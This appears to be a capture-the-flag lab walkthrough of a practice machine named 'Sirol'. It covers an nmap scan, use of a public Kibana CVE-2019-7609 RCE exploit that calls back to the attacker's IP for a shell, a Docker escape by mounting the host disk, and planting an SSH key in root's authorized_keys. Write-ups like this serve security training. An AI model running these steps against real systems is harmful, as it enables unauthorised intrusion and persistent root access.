---
icon: ubuntu
---

# Sirol - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.209.54 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 11:13 EDT
Nmap scan report for 192.168.209.54
Host is up (0.029s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:88:cb:33:78:9a:bf:f0:31:57:d9:2f:ae:13:ee:db (RSA)
|   256 fb:54:3b:ba:f6:68:57:81:e4:65:6e:24:9c:db:6d:8a (ECDSA)
|_  256 be:6e:25:d1:88:09:7e:33:40:b3:56:6a:b4:ce:16:0d (ED25519)
53/tcp    closed domain
80/tcp    open   http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: PHP Calculator                                                                                                                        
3306/tcp  open   mysql   MariaDB 10.3.23 or earlier (unauthorized)                                                                                  
5601/tcp  open   http    Elasticsearch Kibana (serverName: kibana)                                                                                  
| http-title: Kibana                                                                                                                                
|_Requested resource was /app/kibana                                                                                                                
24007/tcp open   rpcbind                                                                                                                            
Aggressive OS guesses: Linux 3.10 - 4.11 (96%), Linux 3.13 - 4.4 (96%), Linux 3.2 - 4.14 (94%), Linux 2.6.32 - 3.13 (93%), Linux 3.8 - 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.13 or 4.2 (90%), Linux 4.4 (90%), Linux 2.6.32 - 3.10 (90%), Linux 5.0 - 5.14 (90%)                                  
No exact OS matches for host (test conditions non-ideal).                                                                                           
Network Distance: 4 hops                                                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                             
                                                                                                                                                    
TRACEROUTE (using port 53/tcp)                                                                                                                      
HOP RTT      ADDRESS                                                                                                                                
1   30.68 ms 192.168.45.1                                                                                                                           
2   30.61 ms 192.168.45.254                                                                                                                         
3   30.73 ms 192.168.251.1                                                                                                                          
4   31.41 ms 192.168.209.54 
```

### <mark style="color:$primary;">HTTP Port 5601 TCP</mark>

<figure><img src="../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

We can check the version of kibana via the dev console

<figure><img src="../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

A quick goolge search revealed an rce exploit

<figure><img src="../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Kibana 6.6.0 RCE</mark>

```
git clone https://github.com/Cr4ckC4t/cve-2019-7609.git
```

{% code overflow="wrap" %}
```bash
python3 cve-2019-7609.py http://192.168.209.54:5601 192.168.45.158 80
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

we are root! in a docker container :rofl: but we are root&#x20;

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Docker Escape via Mount</mark>

We can use `fdisk` to check the drives that are available

<figure><img src="../../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>

`/dev/sda1` must be the host machine! I'll try to use `mount` on it

```
mkdir /mnt/tmp
mount /dev/sda1 /mnt/tmp
```

<figure><img src="../../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>

The above commands gives us `root` access over the host machine's file system

<figure><img src="../../.gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure>

I will create a .ssh directory generate an ssh key and place it in the authorized\_keys file, so we can ssh as root

<figure><img src="../../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>

Now copy id\_rsa.pub and place it into the authorized\_keys

<figure><img src="../../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>

Now we can ssh

<figure><img src="../../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure>
